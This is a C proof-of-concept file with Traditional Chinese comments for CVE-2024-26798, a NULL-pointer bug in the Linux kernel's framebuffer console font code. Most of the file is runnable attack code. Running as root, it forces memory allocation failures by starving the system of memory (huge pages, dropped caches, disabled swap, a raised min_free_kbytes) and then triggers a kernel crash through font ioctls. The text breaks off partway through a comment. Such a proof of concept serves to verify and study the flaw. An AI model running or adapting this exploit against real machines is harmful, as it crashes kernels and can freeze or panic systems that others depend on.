/*
 * CVE-2024-26798 PoC
 *
 * 漏洞位置：drivers/video/fbdev/core/fbcon.c — fbcon_do_set_font()
 *
 * 根本原因：
 *   在 fbcon_do_set_font() 中，只有 p->userfont==true 時才會儲存 old_data。
 *   若 p->userfont==false（系統字型），old_data 維持 NULL。
 *   vc_resize() 失敗時執行 err_out：vc->vc_font.data = old_data = NULL。
 *   下次 KD_FONT_OP_GET → fbcon_get_font() → FNTSIZE(NULL) → kernel page fault。
 *
 * 修補方式：
 *   old_data 無條件初始化為 vc->vc_font.data。
 *
 * 觸發策略 A（fail_page_alloc，需 CONFIG_FAULT_INJECTION_DEBUG_FS + CONFIG_FAIL_PAGE_ALLOC）：
 *   利用 debugfs 的 fail_page_alloc 介面直接讓 kzalloc 回傳 ENOMEM。
 *
 * 觸發策略 B（vm.min_free_kbytes，只需 root，無需任何 kernel config）：
 *   1. Warm-up：暖 slab cache，再 drop_caches 清除 page cache
 *   2. 將 min_free_kbytes 調高超過目前 MemAvailable
 *      → WMARK_MIN > free pages → 頁面分配進入 direct reclaim
 *      → page cache 已清空 → reclaim 失敗 → ENOMEM
 *   3. SET 返回後立即還原 min_free_kbytes（危險窗口 < 1ms）
 *
 *   關鍵問題：
 *     fbcon_set_font() 先呼叫 kmalloc(font_data) 再呼叫 fbcon_do_set_font()。
 *     若 slab cache 是冷的，kmalloc 本身就需要 page allocation，fault inject 會
 *     先打中它而非 vc_do_resize() 內的 kzalloc，導致 fbcon_do_set_font 從未被呼叫。
 *
 *   解法：warm-up（二段式注入）
 *     1. SET_DEFAULT → p->userfont=0
 *     2. SET(height=6, 不注入) → 暖 kmalloc-2048 slab cache；SET_DEFAULT → 釋放回 slab
 *        （此時 slab 有 free slot，下一次 kmalloc 直接從 slab 取用，不需 page alloc）
 *     3. 啟用 fail_page_alloc（probability=100, min-order=0, task-filter=1）
 *     4. SET(height=6, 注入中)：
 *          kmalloc(font_data) → slab warm → 不觸發 page alloc ✓
 *          vc_do_resize() kzalloc(cols*2*rows)：height=6 使 rows 最大化，
 *          新 screen_size >> KMALLOC_MAX_CACHE_SIZE(8192) → kmalloc_large →
 *          alloc_pages(order≥3) → ENOMEM → err_out → vc_font.data = NULL ✓
 *     5. KD_FONT_OP_GET → FNTSIZE(NULL) → crash
 *
 * 使用方式（需 root）：
 *   sudo ./poc [tty裝置]             預設：/dev/tty1（策略 A → 自動 fallback 策略 B）
 *   sudo ./poc --watermark [tty]     強制使用策略 B（vm.min_free_kbytes）
 *   sudo ./poc --bug-state-only [tty] 只驗證 bug state 達成，不觸發 crash
 *
 * 觸發策略優先順序（不使用 kernel module，不修改 kernel config）：
 *   策略 A（fail_page_alloc，需 CONFIG_FAULT_INJECTION_DEBUG_FS + CONFIG_FAIL_PAGE_ALLOC）
 *   策略 B（vm.min_free_kbytes，只需 root，無需任何 kernel config）[自動 fallback]
 *
 * 預期結果（unpatched kernel）：
 *   Kernel BUG / Oops — NULL pointer dereference
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <signal.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <linux/kd.h>
#include <linux/vt.h>   /* VT_ACTIVATE, VT_WAITACTIVE, VT_GETSTATE, struct vt_stat */
#include <sys/mman.h>   /* mlockall, mmap */
#include <sys/swap.h>   /* swapoff, swapon, SWAP_FLAG_* */
#include <sched.h>      /* sched_yield */
#include <limits.h>

#define DEFAULT_VT_DEVICE "/dev/tty1"

/*
 * 觸發用字型高度：必須使 vc_do_resize() 的 new_screen_size 落在 order > 3。
 *
 * 原因：PAGE_ALLOC_COSTLY_ORDER = 3。
 *   order ≤ 3（non-costly）：__alloc_pages_slowpath 會呼叫 OOM killer，
 *     以 oom_kill_allocating_task=1 殺掉 wm_child → 設 TIF_MEMDIE →
 *     retry 時加入 ALLOC_NO_WATERMARKS → 即使 MemFree < WMARK_MIN 也可分配 →
 *     kzalloc 成功 → vc_font.data 非 NULL → bug state 未觸發。
 *   order > 3（costly）：slowpath line 4778:
 *     if (costly_order && !(gfp_mask & __GFP_RETRY_MAYFAIL)) goto nopage;
 *     直接回傳 NULL，完全不呼叫 OOM killer → kzalloc(NULL) → ENOMEM → bug state ✓。
 *
 * 計算（1024×768 EFI VGA，width=8）：
 *   cols = 1024/h_fb_char (fixed), rows = 768/height
 *   new_screen_size = cols * rows * 2
 *   h=6: size=32768 → order=3 = PAGE_ALLOC_COSTLY_ORDER → costly=FALSE  ✗
 *   h=4: size=49152 → order=4 > PAGE_ALLOC_COSTLY_ORDER → costly=TRUE   ✓
 *   h=3: size=65536 → order=4                           → costly=TRUE   ✓
 *
 * vt.c con_font_set 只要求 width>0, height≤32；無最小高度限制。
 * blit_y=0xFFFFFFFF（fbmem.c:1633-1637）→ 所有高度 1–32 皆支援。
 */
#define FONT_HEIGHT_MIN  4   /* order=4 → costly_order=TRUE → clean ENOMEM, no OOM */
#define FONT_HEIGHT_ALT  3   /* sys_h=4 時的備用；order=4 → 同上 */
#define FONT_WIDTH       8
#define FONT_CHARCOUNT   256
/* kmalloc 大小 = FONT_EXTRA_WORDS(3)*4 + height*width_bytes*charcount */
#define FONT_DATA_SIZE(h)  (((FONT_WIDTH + 7) / 8) * (h) * FONT_CHARCOUNT)
#define GET_FONT_DATA_MAX  65536

/* fail_page_alloc debugfs 路徑 */
#define FAIL_DIR    "/sys/kernel/debug/fail_page_alloc"
#define MAKE_FAIL   "/proc/self/make-it-fail"

/* ── forward declarations ───────────────────────────────────────────── */
static unsigned int probe_font_height(int fd);
static int set_default_font(int fd);
static int set_font(int fd, unsigned int height, unsigned char *font_data);

/* ── 工具函式 ─────────────────────────────────────────────────────────── */

static void log_error(const char *action, int err)
{
    fprintf(stderr, "[!] %s failed: %s (errno=%d)\n", action, strerror(err), err);
    if (err == EACCES || err == EPERM)
        fprintf(stderr, "    hint: Need root. Try: sudo ./poc\n");
    else if (err == ENOTTY)
        fprintf(stderr, "    hint: Not a framebuffer VT.\n");
}

static int write_file(const char *path, const char *val)
{
    int fd = open(path, O_WRONLY);
    if (fd < 0) return -1;
    ssize_t n = write(fd, val, strlen(val));
    close(fd);
    return (n < 0) ? -1 : 0;
}

/* ── vm.min_free_kbytes 觸發路徑（無需任何 kernel config）────────────
 *
 * 原理：
 *   vc_do_resize() 呼叫 kzalloc(new_screen_size, GFP_USER)，最終走到
 *   alloc_pages(GFP_USER, order)。page allocator 在
 *     free_pages < WMARK_MIN
 *   時進入 slowpath。
 *
 *   vm.min_free_kbytes 控制每個 zone 的 WMARK_MIN。
 *
 *   關鍵：字型高度必須產生 costly order（order > PAGE_ALLOC_COSTLY_ORDER=3）。
 *
 *   costly order（order > 3）路徑（__alloc_pages_slowpath line 4778）：
 *     if (costly_order && !(gfp_mask & __GFP_RETRY_MAYFAIL)) goto nopage;
 *   direct reclaim 和 compaction 均失敗後（drop_caches+swapoff 確保無可回收頁），
 *   直接回傳 NULL，完全不呼叫 OOM killer。
 *   → kzalloc 回傳 NULL → ENOMEM → err_out → vc_font.data=NULL → bug state ✓
 *
 *   GFP_USER 不包含 __GFP_RETRY_MAYFAIL，確保 costly_order goto nopage 生效。
 *
 *   非 costly order（order ≤ 3）的問題（height=6 → order=3 的舊方案）：
 *     OOM killer 以 oom_kill_allocating_task=1 殺掉 child → TIF_MEMDIE →
 *     ALLOC_NO_WATERMARKS → 即使 MemFree < WMARK_MIN 也能分配 →
 *     kzalloc 成功 → bug state 未觸發。
 *
 *   為防止 direct reclaim 透過回收 page cache 救回分配：
 *     先 echo 3 > /proc/sys/vm/drop_caches 清除所有可回收快取。
 *
 * 步驟：
 *   1. SET_DEFAULT → p->userfont=0（vc_font.data 指向 built-in，old_data=NULL）
 *   2. HugeTLB 壓縮 MemFree 至 ~2 GB（使 new_min << MemTotal）
 *   3. drop_caches → 清除 page cache / slab unreferenced → reclaim 無效
 *   4. 保存原始 min_free_kbytes
 *   5. 設 min_free_kbytes = 3 × MemFree
 *   6. KD_FONT_OP_SET(h=4) → kzalloc(49152, GFP_USER, order=4)
 *      → costly_order → goto nopage → NULL → ENOMEM
 *      → err_out → vc_font.data=NULL
 *   7. 立即還原 min_free_kbytes 後執行 GET → crash ✓
 *
 * 優點：不需填滿 RAM（立即生效），需求：root，無需任何特殊 kernel config。
 */

static long read_min_free_kbytes(void)
{
    FILE *f = fopen("/proc/sys/vm/min_free_kbytes", "r");
    if (!f) return -1;
    long val = -1;
    if (fscanf(f, "%ld", &val) != 1) val = -1;
    fclose(f);
    return val;
}

static long read_mem_available_kb(void)
{
    FILE *f = fopen("/proc/meminfo", "r");
    if (!f) return -1;
    char key[64];
    long val;
    while (fscanf(f, "%63s %ld kB\n", key, &val) == 2) {
        if (strcmp(key, "MemAvailable:") == 0) { fclose(f); return val; }
    }
    fclose(f);
    return -1;
}

static long read_mem_total_kb(void)
{
    FILE *f = fopen("/proc/meminfo", "r");
    if (!f) return -1;
    char key[64];
    long val;
    while (fscanf(f, "%63s %ld kB\n", key, &val) == 2) {
        if (strcmp(key, "MemTotal:") == 0) { fclose(f); return val; }
    }
    fclose(f);
    return -1;
}

static long read_mem_free_kb(void)
{
    FILE *f = fopen("/proc/meminfo", "r");
    if (!f) return -1;
    char key[64];
    long val;
    while (fscanf(f, "%63s %ld kB\n", key, &val) == 2) {
        if (strcmp(key, "MemFree:") == 0) { fclose(f); return val; }
    }
    fclose(f);
    return -1;
}

/* HugeTLB 輔助：讀寫 /proc/sys/vm/nr_hugepages */
static long read_nr_hugepages(void)
{
    FILE *f = fopen("/proc/sys/vm/nr_hugepages", "r");
    if (!f) return -1;
    long val = -1;
    if (fscanf(f, "%ld", &val) != 1) val = -1;
    fclose(f);
    return val;
}

/*
 * apply_hugepage_pressure — 用 HugeTLB 頁面消耗空閒記憶體
 *
 * 在大記憶體閒置系統（MemFree ≈ MemTotal），單純調高 min_free_kbytes 無效，
 * 原因是 kswapd 可以回收 Slab/Cached（幾百 MB）輕易滿足 new_min > MemFree 的差距。
 *
 * HugeTLB 頁面一旦分配就從 buddy allocator 移除（non-reclaimable），
 * 且分配速度快（kernel 直接移動頁面，不需寫入）。
 * 分配後 MemFree 急劇下降，使 new_min 可以安全設到 MemFree 以上而遠低於 MemTotal。
 *
 * 傳回值：成功時填入 *out_nr（設定後的 nr_hugepages），原始值於 *out_orig；
 *         失敗回傳 -1（系統不支援 HugeTLB 或 root 不足時退化為原始策略）。
 */
static int apply_hugepage_pressure(long target_free_kb,
                                   long *out_orig, long *out_nr)
{
    long orig = read_nr_hugepages();
    if (orig < 0) { *out_orig = 0; *out_nr = 0; return -1; }
    *out_orig = orig;

    long free_kb = read_mem_free_kb();
    if (free_kb <= 0) { *out_nr = orig; return -1; }

    if (free_kb <= target_free_kb) {
        /* 記憶體已夠緊，不需額外壓力 */
        *out_nr = orig;
        return 0;
    }

    long to_consume_kb = free_kb - target_free_kb;
    long hp_size_kb    = 2048;   /* 2 MB hugepage */
    long n_new         = to_consume_kb / hp_size_kb;
    if (n_new <= 0) { *out_nr = orig; return -1; }

    char buf[32];
    snprintf(buf, sizeof(buf), "%ld", orig + n_new);
    fprintf(stderr,
            "[*] HugeTLB: 分配 %ld × 2MB hugepages（~%ld MB）壓縮空閒頁...\n",
            n_new, n_new * 2);
    if (write_file("/proc/sys/vm/nr_hugepages", buf) < 0) {
        fprintf(stderr, "[!] nr_hugepages 設定失敗（HugeTLB 不支援或 root 不足）\n");
        *out_nr = orig;
        return -1;
    }

    /* 等待 kernel 完成 hugepage 分配（通常 < 1s） */
    usleep(500000);

    long actual_free = read_mem_free_kb();
    long actual_nr   = read_nr_hugepages();
    *out_nr = (actual_nr > 0) ? actual_nr : orig + n_new;

    fprintf(stderr,
            "[*] HugeTLB 後 MemFree: %ld MB（分配了 %ld × 2MB hugepages）\n",
            actual_free / 1024, *out_nr - orig);
    return 0;
}

static void release_hugepage_pressure(long orig_nr)
{
    char buf[32];
    snprintf(buf, sizeof(buf), "%ld", orig_nr);
    write_file("/proc/sys/vm/nr_hugepages", buf);
}

/* ── Swap save/restore helpers ────────────────────────────────────────────── */

struct swap_dev {
    char path[256];
    int  prio;          /* priority read from /proc/swaps; -1 = auto */
};

/*
 * swapoff_all: disable all active swap devices.
 *
 * Without swap, __alloc_pages_slowpath cannot reclaim pages via kswapd's
 * swap-write path.  After drop_caches=3 the page cache is also empty, so
 * direct reclaim finds nothing and returns ENOMEM in microseconds instead
 * of tens of seconds — the dangerous window is negligible.
 *
 * Returns number of devices successfully turned off (fills devs[]).
 */
static int swapoff_all(struct swap_dev *devs, int max_devs)
{
    FILE *fp = fopen("/proc/swaps", "r");
    if (!fp)
        return 0;

    int count = 0;
    char line[512];
    fgets(line, sizeof(line), fp);          /* skip header */

    while (count < max_devs && fgets(line, sizeof(line), fp)) {
        char type[64];
        int sz, used, prio;
        if (sscanf(line, "%255s %63s %d %d %d",
                   devs[count].path, type, &sz, &used, &prio) < 5)
            continue;
        if (swapoff(devs[count].path) == 0) {
            devs[count].prio = prio;
            count++;
        } else {
            fprintf(stderr, "[!] swapoff(%s) 失敗: %s（繼續執行）\n",
                    devs[count].path, strerror(errno));
        }
    }
    fclose(fp);
    if (count > 0)
        fprintf(stderr, "[*] swapoff %d 個裝置 ✓（防 swap-in deadlock）\n", count);
    return count;
}

/* swapon_all: re-enable swap devices disabled by swapoff_all, restoring
 * their original priorities. */
static void swapon_all(const struct swap_dev *devs, int count)
{
    for (int i = 0; i < count; i++) {
        /* prio < 0 means kernel-assigned auto priority; swapon(dev, 0) is
         * equivalent — kernel picks the next available auto priority. */
        int flags = (devs[i].prio >= 0)
                    ? (SWAP_FLAG_PREFER | (devs[i].prio & SWAP_FLAG_PRIO_MASK))
                    : 0;
        if (swapon(devs[i].path, flags) != 0)
            fprintf(stderr, "[!] swapon(%s) 失敗: %s\n",
                    devs[i].path, strerror(errno));
    }
    if (count > 0)
        fprintf(stderr, "[*] swapon %d 個裝置 ✓\n", count);
}

static void trigger_get(int fd, int in_bug_state);  /* forward declaration */

static int trigger_via_watermark(int fd, int do_get, int *get_result)
{
    fprintf(stderr, "[*] 使用 vm.min_free_kbytes 觸發（無需 kernel config）\n");

    /* 保護本 process 不被 OOM killer 選中 */
    int ofd = open("/proc/self/oom_score_adj", O_WRONLY);
    if (ofd >= 0) { ssize_t _w = write(ofd, "-1000", 5); (void)_w; close(ofd); }

    /*
     * Strategy B（watermark）不需要 warm-up slab cache。
     *
     * 原因：
     *   vc_do_resize() 呼叫 kzalloc(new_screen_size, GFP_USER)。
     *   若 kmalloc-131072 slab 已有 free object（e.g. 被之前的 set_font 暖過），
     *   kzalloc 會直接從 per-CPU freelist 回傳該 object，完全不碰 buddy allocator，
     *   因此繞過 WMARK_MIN 水位檢查 → vc_do_resize 成功 → bug state 未觸發。
     *
     *   相反地，若 slab 是冷的（無 free object），kzalloc 必須向 buddy 申請新 slab page，
     *   此時 GFP_USER 的 WMARK_MIN 水位檢查生效 → 分配失敗 → ENOMEM → bug state ✓。
     *
     * 因此：此處刻意跳過任何暖 slab 的動作，確保 slab 保持冷狀態。
     *
     * 只需在 watermark 設定前呼叫 set_default_font 以確保 p->userfont=0（讓
     * fbcon_do_set_font 的 old_data 為 NULL）。此時 watermark 尚未設定，
     * 分配必然成功，不影響 slab 熱度。
     */
    unsigned int sys_h    = probe_font_height(fd);
    unsigned int target_h = (sys_h == FONT_HEIGHT_MIN) ? FONT_HEIGHT_ALT : FONT_HEIGHT_MIN;

    if (set_default_font(fd) == 0)
        fprintf(stderr, "[*] SET_DEFAULT → p->userfont=0\n");

    size_t fdata_sz = FONT_DATA_SIZE(target_h);
    unsigned char *fdata = calloc(1, fdata_sz + 12);
    if (!fdata) { log_error("calloc", errno); return -1; }

    /* ── 清除 page cache，防止 direct reclaim 透過 cache 回收救活分配 ── */
    fprintf(stderr, "[*] echo 3 > /proc/sys/vm/drop_caches\n");
    if (write_file("/proc/sys/vm/drop_caches", "3") < 0)
        fprintf(stderr, "[!] drop_caches 失敗（需 root），reclaim 可能仍有效\n");
    usleep(200000);

    long orig_min = read_min_free_kbytes();
    if (orig_min < 0) {
        fprintf(stderr, "[!] 無法讀取 min_free_kbytes\n");
        free(fdata); return -1;
    }
    char orig_min_str[32];
    snprintf(orig_min_str, sizeof(orig_min_str), "%ld", orig_min);

    /*
     * 在大記憶體閒置系統（MemFree ≈ MemTotal，例如 117GB / 119GB）：
     *
     * 問題：new_min 必須 > MemFree 才能讓 32KB 分配失敗，但 MemFree 僅比 MemTotal
     *       少幾 GB，設定 new_min > MemFree 就等同讓 WMARK_MIN ≈ MemTotal，
     *       導致全系統所有分配都立即失敗（等同 kernelpanic.jpg 的 OOM 死鎖）。
     *
     * 原始公式缺陷（avail × 1.1 → panic 的根本原因）：
     *   MemAvailable = 114GB, MemTotal = 116GB → new_min = 125GB > MemTotal → PANIC
     *
     * 解法：先用 HugeTLB 頁面把 MemFree 壓低到安全範圍（~1GB）
     * ──────────────────────────────────────────────────────────
     * HugeTLB 頁面一旦分配就從 buddy allocator 移除（non-reclaimable），
     * 且分配速度快（kernel 直接移動頁面，不需寫入大量記憶體）。
     *
     * 分配後狀態（以本機 119GB 為例）：
     *   MemFree ≈ 1GB（其餘 118GB 在 HugeTLB pool）
     *   new_min = 2GB  →  2GB > 1GB (MemFree) → 分配失敗 ✓
     *             2GB << 119GB (MemTotal)       → 系統安全 ✓
     *   kswapd 可回收量 ≈ SReclaimable（~幾十 MB）<< gap（1GB）→ ENOMEM ✓
     *
     * 還原：設 nr_hugepages = orig → 頁面立即歸還 buddy allocator → 系統恢復 ✓
     */
    long total_kb = read_mem_total_kb();
    /*
     * 目標：HugeTLB 壓縮後保留 ~2GB MemFree。
     *
     * 為什麼是 2GB 而非 1GB？
     *   new_min 設為 MemFree + 256MB。
     *   GFP_USER（vc_do_resize）：需要 free > new_min → 失敗 ✓
     *   GFP_KERNEL ALLOC_HARDER（kthreadd 等 kernel 內部分配）：
     *     有效門檻 = new_min / 2 = (2GB + 256MB) / 2 ≈ 1.1GB
     *     實際 free ≈ 2GB > 1.1GB → 成功 ✓
     *   → kernel 自身分配不受影響，避免 OOM deadlock panic。
     */
    long target_free_kb = 2 * 1024 * 1024;  /* 2 GB 目標剩餘 */
    long new_min_kb     = 0;             /* 稍後依 free_kb 決定 */

    long hp_orig = 0, hp_set = 0;
    int used_hugepages = 0;

    long free_before = read_mem_free_kb();
    if (free_before > target_free_kb * 3) {
        /* MemFree 遠超目標，需要 HugeTLB 壓力 */
        if (apply_hugepage_pressure(target_free_kb, &hp_orig, &hp_set) == 0) {
            used_hugepages = 1;
            /* 壓縮後再次 drop_caches（HugeTLB 分配可能帶入新 slab） */
            write_file("/proc/sys/vm/drop_caches", "3");
            usleep(100000);
        } else {
            fprintf(stderr, "[!] HugeTLB 壓力失敗，退回 avail+gap/2 公式\n");
        }
    }

    /* 讀取壓縮後的實際 MemFree */
    long free_kb = read_mem_free_kb();
    if (free_kb < 0) {
        if (used_hugepages) release_hugepage_pressure(hp_orig);
        free(fdata); return -1;
    }

    if (!used_hugepages) {
        /*
         * HugeTLB 不可用（或 MemFree 已夠低）：退回 avail+gap/2 公式
         * 在 MemFree << MemTotal 的系統上（一般生產環境）此公式有效。
         */
        long avail_kb = read_mem_available_kb();
        long gap_kb   = (total_kb > avail_kb) ? (total_kb - avail_kb) : 0;
        if (gap_kb < 1024) {
            fprintf(stderr,
                "[!] 安全中斷：MemAvailable(%ld MB) 與 MemTotal(%ld MB) 差距 < 1MB\n"
                "    請改用 kernel module 觸發模式。\n",
                avail_kb / 1024, total_kb > 0 ? total_kb / 1024 : -1L);
            free(fdata); return -1;
        }
        new_min_kb = avail_kb + gap_kb / 2;
        fprintf(stderr,
                "[*] 退回公式：MemAvail=%ld MB，MemTotal=%ld MB，gap=%ld MB\n"
                "[*] min_free_kbytes: %ld → %ld KB\n",
                avail_kb / 1024, total_kb / 1024, gap_kb / 1024, orig_min, new_min_kb);
    } else {
        /*
         * HugeTLB 壓縮後計算 new_min：
         *
         *   new_min = free_kb × 3
         *
         *   原理（Linux page allocator watermark 機制）：
         *     GFP_USER（vc_do_resize kzalloc）直接失敗路徑：
         *       alloc_flags = ALLOC_WMARK_MIN，有效門檻 = WMARK_MIN = new_min
         *       free_kb < new_min = 3×free_kb → ENOMEM ✓（進入 slowpath）
         *
         *     Slowpath + OOM killer（oom_kill_allocating_task=1）：
         *       OOM kills child → mark_oom_victim() → tsk_is_oom_victim=true
         *       retry: __gfp_pfmemalloc_flags → ALLOC_OOM → alloc_flags |= ALLOC_OOM
         *       __zone_watermark_ok with ALLOC_OOM: min -= min/2 → 有效門檻 = new_min/2
         *       = 3×free_kb / 2 = 1.5×free_kb > free_kb → 仍然失敗 ✓
         *       tsk_is_oom_victim(current) && alloc_flags & ALLOC_OOM → goto nopage
         *       → kzalloc returns NULL → ENOMEM → err_out → vc_font.data = NULL ✓
         *
         *   乘數 3 的依據：
         *     ALLOC_OOM 將 WMARK_MIN 減半（min -= min/2），需要 new_min > 2×free_kb
         *     才能確保 new_min/2 > free_kb。使用 3× 留有額外 1× 的安全邊距，
         *     抵抗 OOM victim 釋放記憶體或 kswapd 回收（通常 < 200MB）。
         */
        new_min_kb = free_kb * 3;
        fprintf(stderr,
                "[*] HugeTLB 壓縮後 MemFree=%ld MB，new_min=%ld MB（MemTotal=%ld MB）\n",
                free_kb / 1024, new_min_kb / 1024, total_kb / 1024);
        if (new_min_kb >= total_kb) {
            fprintf(stderr,
                "[!] 安全中斷：壓縮後 MemFree(%ld MB) × 3 >= MemTotal(%ld MB)\n"
                "    HugeTLB 消耗量不足（nr_hugepages 上限或記憶體碎片）。\n",
                free_kb / 1024, total_kb / 1024);
            release_hugepage_pressure(hp_orig);
            free(fdata); return -1;
        }
    }

    /*
     * 封鎖 Zone DMA fallback（ARM64 需要）
     * ───────────────────────────────────────
     * lowmem_reserve_ratio[DMA] = 1 讓 Zone DMA 為 Zone Normal 保留的 headroom
     * = Zone Normal managed / 1 ≈ 115GB >> Zone DMA free pages (~770MB)
     * 使得 Zone DMA 對 ZONE_NORMAL fallback 的 effective_free 為負數 → 不可用。
     * 危險窗口極短（僅 ioctl 執行期間），還原後立即恢復正常。
     */
    char orig_reserve_ratio[64];
    char buf_reserve[64];
    int blocked_dma = 0;
    {
        FILE *rf = fopen("/proc/sys/vm/lowmem_reserve_ratio", "r");
        if (rf) {
            if (fgets(orig_reserve_ratio, sizeof(orig_reserve_ratio), rf))
                blocked_dma = 1;
            fclose(rf);
        }
        if (blocked_dma) {
            /* 保持原值中的其他 zone ratio，只把第一個（DMA）改為 1 */
            char tmp[64];
            strncpy(tmp, orig_reserve_ratio, sizeof(tmp));
            /* 去掉尾端換行 */
            tmp[strcspn(tmp, "\n")] = '\0';
            /* 找第一個 token（DMA ratio）並替換為 1 */
            char *rest = strchr(tmp, '\t');
            if (!rest) rest = strchr(tmp, ' ');
            snprintf(buf_reserve, sizeof(buf_reserve), "1%s", rest ? rest : "");
            if (write_file("/proc/sys/vm/lowmem_reserve_ratio", buf_reserve) < 0) {
                fprintf(stderr, "[!] lowmem_reserve_ratio 設定失敗，Zone DMA fallback 可能仍有效\n");
                blocked_dma = 0;
            } else {
                fprintf(stderr, "[*] lowmem_reserve_ratio: DMA ratio 1→%s（封鎖 Zone DMA fallback）\n",
                        buf_reserve);
            }
        }
    }

    /*
     * ── 觸發：pipe(child→parent) + 共享記憶體 flag(parent→child) + mlockall ──
     *
     * 根本問題（第三次 kdump 分析，PID 4619/4620）：
     *   上一版使用 go_pipe[1] 讓 parent 通知 child，但 pipe_write() 本身
     *   需要分配 pipe buffer 頁面（alloc_pages_current）。watermark 設高後，
     *   parent 的 write(go_pipe[1]) 也卡在 __alloc_pages_slowpath → 死鎖：
     *     parent: pipe_write → alloc_pages_slowpath （持有 pipe->mutex，卡住）
     *     child:  pipe_release → mutex_lock         （等同一把 pipe->mutex）
     *
     * 根本修法：parent→child 的 go 信號改用 mmap(MAP_SHARED|MAP_ANONYMOUS)
     *   的 volatile flag。父子程序共享同一個物理頁面（非 COW），
     *   對該頁面的寫入不觸發任何 kernel 記憶體分配，不受 watermark 影響。
     *
     * 同步流程：
     *   child:  mlockall() → write(sync_pipe[1]) → spin 等 *go_flag → set_font()
     *   parent: read(sync_pipe[0]) → 設 watermark → *go_flag=1 → waitpid → 還原
     */

    /* go_flag：MAP_SHARED|MAP_ANONYMOUS，父子共享，寫入不分配任何頁面 */
    volatile int *go_flag = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
                                 MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    if (go_flag == MAP_FAILED) {
        log_error("mmap(go_flag)", errno);
        if (blocked_dma) write_file("/proc/sys/vm/lowmem_reserve_ratio", orig_reserve_ratio);
        if (used_hugepages) release_hugepage_pressure(hp_orig);
        free(fdata); return -1;
    }
    *go_flag = 0;
    __sync_synchronize(); /* 確保 fork 前頁面已 fault-in */

    /* sync_pipe：child→parent，只在 watermark 設高前使用，pipe_write 安全 */
    int sync_pipe[2];
    if (pipe(sync_pipe) < 0) {
        log_error("pipe", errno);
        munmap((void *)go_flag, 4096);
        if (blocked_dma) write_file("/proc/sys/vm/lowmem_reserve_ratio", orig_reserve_ratio);
        if (used_hugepages) release_hugepage_pressure(hp_orig);
        free(fdata); return -1;
    }

    pid_t wm_child = fork();
    if (wm_child < 0) {
        log_error("fork(watermark child)", errno);
        close(sync_pipe[0]); close(sync_pipe[1]);
        munmap((void *)go_flag, 4096);
        if (blocked_dma) write_file("/proc/sys/vm/lowmem_reserve_ratio", orig_reserve_ratio);
        if (used_hugepages) release_hugepage_pressure(hp_orig);
        free(fdata); return -1;
    }

    if (wm_child == 0) {
        close(sync_pipe[0]);

        /*
         * 重設 oom_score_adj 為 0（parent 設了 -1000；繼承後 OOM killer 不選我們）。
         *
         * 使用 height=4（costly_order=TRUE）路徑：OOM killer 不會被呼叫，
         * ioctl 直接以 ENOMEM 返回（__alloc_pages_slowpath → goto nopage）。
         * adj=0 是安全措施，以防邊緣情況導致 OOM 觸發：
         *   adj=-1000 → oom_badness()=LONG_MIN → oom_kill_allocating_task=1 跳過
         *   → 尋找其他 victim → 若無 victim 則 panic。
         * adj=0 確保 child 可被選中（不 panic），但在 costly_order 路徑中不會發生。
         */
        {
            int oom_fd = open("/proc/self/oom_score_adj", O_WRONLY);
            if (oom_fd >= 0) { ssize_t _ww = write(oom_fd, "0", 1); (void)_ww; close(oom_fd); }
        }

        /*
         * mlockall(MCL_CURRENT|MCL_FUTURE)：在 watermark 設高之前完成。
         * fault-in 並鎖定所有 COW 頁面（stack、heap、libc mapping 等），
         * 使 child 之後的執行路徑完全不觸發 userspace page allocation。
         */
        if (mlockall(MCL_CURRENT | MCL_FUTURE) < 0) {
            /* 失敗時繼續：可能因 RLIMIT_MEMLOCK，仍嘗試觸發 */
        }

        /* 通知 parent：mlockall 完成，可以設 watermark */
        char rdy = '!';
        ssize_t _sw = write(sync_pipe[1], &rdy, 1); (void)_sw;
        close(sync_pipe[1]);

        /*
         * 等待 parent 的 go 信號。
         * 使用 spin + sched_yield：
         *   - 不呼叫任何可能分配記憶體的函式
         *   - sched_yield() 只是 syscall，不分配任何頁面
         */
        while (!__atomic_load_n(go_flag, __ATOMIC_ACQUIRE))
            sched_yield();

        int r = set_font(fd, target_h, fdata);
        int e = errno;
        free(fdata);
        munmap((void *)go_flag, 4096);
        if (r == -1 && e == ENOMEM) _exit(42);
        if (r == 0)                  _exit(0);
        _exit(1);
    }

    /* parent */
    close(sync_pipe[1]);
    free(fdata);

    /* 等待 child 完成 mlockall */
    char rdy;
    ssize_t _r = read(sync_pipe[0], &rdy, 1); (void)_r;
    close(sync_pipe[0]);

    /*
     * ── 防 swap-in deadlock：鎖定 parent 頁面 + 暫停 swap ─────────────────
     *
     * 第三次 kdump（16:18）根本原因：
     *   kswapd 在 WMARK_MIN 壓力下把 systemd/sshd/parent 的頁面 swap out。
     *   swap-out 使用特殊回收 GFP flag（可繞過 watermark），但
     *   swap-in（do_swap_page）使用 GFP_HIGHUSER_MOVABLE，
     *   受同一 WMARK_MIN 限制 → 單向閘門：只出不進 → 系統凍結。
     *
     * 修法 1：mlockall(parent) — 防止 kswapd 把 parent 的頁面 swap out，
     *   確保 futex_cleanup / atexit / signal handler 都有可用的物理頁面。
     *   必須在 fork 之後、設 watermark 之前呼叫（不繼承）。
     *
     * 修法 2：swapoff 所有裝置 — drop_caches=3 已清除 page cache，
     *   無 swap + 無 page cache → __alloc_pages_slowpath 直接失敗（ENOMEM），
     *   GFP_USER 分配在 < 1ms 內返回，危險窗口幾乎消失；
     *   其他進程也不會因 swap-in 請求卡在 D state。
     *
     * swapoff 後重讀 MemFree：swap-in 把少量頁面歸還 RAM，
     *   確保 new_min_kb 計算使用最新的記憶體狀態。
     */

    /* 1. 鎖定 parent 所有頁面 */
    if (mlockall(MCL_CURRENT | MCL_FUTURE) < 0)
        fprintf(stderr, "[!] mlockall(parent) 失敗: %s（繼續執行）\n", strerror(errno));

    /*
     * ── 切換 VT ────────────────────────────────────────────────────────
     *
     * 必須在 swapoff 和 watermark 之前執行，原因：
     *
     * (A) VT_ACTIVATE 需要 vc_allocate(2)，後者使用 GFP_KERNEL 小量分配。
     *     watermark 設為 MemFree + 256MB 後，WMARK_MIN 超過實際可用記憶體，
     *     連 GFP_KERNEL 的 slow-path 也無法通過（無可回收頁面），vc_allocate
     *     失敗 → VT 切換失敗 → fg_console 仍為 1。
     *
     * (B) fb_flashcursor（cursor blink 工作項）不走 printk / console_unlock，
     *     而是直接呼叫 fbcon_cursor()：
